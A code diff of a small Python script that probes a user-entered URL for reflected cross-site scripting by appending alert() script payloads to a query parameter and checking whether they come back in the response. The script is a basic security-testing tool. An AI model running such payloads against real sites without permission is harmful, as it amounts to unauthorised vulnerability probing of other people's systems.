@@ -1,36 +1,50 @@
 import requests
 
 def check_xss(url):
-    print(f"\n[+] Testing {url} for Reflected XSS...")
-    
-    # The payload we want to inject
-    # We use a harmless script that just pops up an alert box
-    payload = "<script>alert('XSS')</script>"
-    
-    # Construct the malicious URL
-    # We assume the URL ends with a parameter like ?q=
-    target_url = f"{url}{payload}"
-    print(f"  > Injecting payload: {payload}")
-    
-    try:
-        # Send the request
-        response = requests.get(target_url)
+    print(f"\nTesting {url} for reflected XSS...\n")
+
+    # Basic payload variations
+    payloads = [
+        "<script>alert(1)</script>",
+        "'><script>alert(1)</script>"
+    ]
+
+    headers = {
+        "User-Agent": "Mozilla/5.0"
+    }
+
+    vulnerable = False
+
+    for payload in payloads:
+        target_url = f"{url}{payload}"
+        print(f"Trying payload: {payload}")
+
+        try:
+            response = requests.get(target_url, headers=headers, timeout=5)
+
+            # Convert to lowercase to avoid case mismatch
+            if payload.lower() in response.text.lower():
+                print("\nPossible reflected XSS detected!")
+                print(f"Payload: {payload}")
+                print(f"URL: {target_url}")
+                vulnerable = True
+                break
+
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+            break
+
+    if not vulnerable:
+        print("\nNo reflected payload found.")
         
-        # ANALYSIS:
-        # If the website is vulnerable, it will include our <script> tag 
-        # inside the HTML it sends back to us.
-        if payload in response.text:
-            print(f"\n[!!!] XSS VULNERABILITY FOUND!")
-            print(f"      The server reflected the payload: {payload}")
-            print(f"      Target: {target_url}")
-        else:
-            print("\n[-] The payload was not reflected. Likely safe.")
-            
-    except Exception as e:
-        print(f"  [!] Connection Error: {e}")
 
 if __name__ == "__main__":
-    # Test URL - This is a real vulnerable search page
-    print("Tip: Use a URL with a parameter, like a search page.")
-    target = input("Enter URL (e.g., http://testphp.vulnweb.com/listproducts.php?cat=): ")
-    check_xss(target)
+    print("Basic XSS Testing Script")
+    print("Note: The URL should end with a parameter like ?q=\n")
+
+    user_input = input("Target URL: ").strip()
+
+    if user_input == "":
+        print("You did not enter any URL.")
+    else:
+        check_xss(user_input)
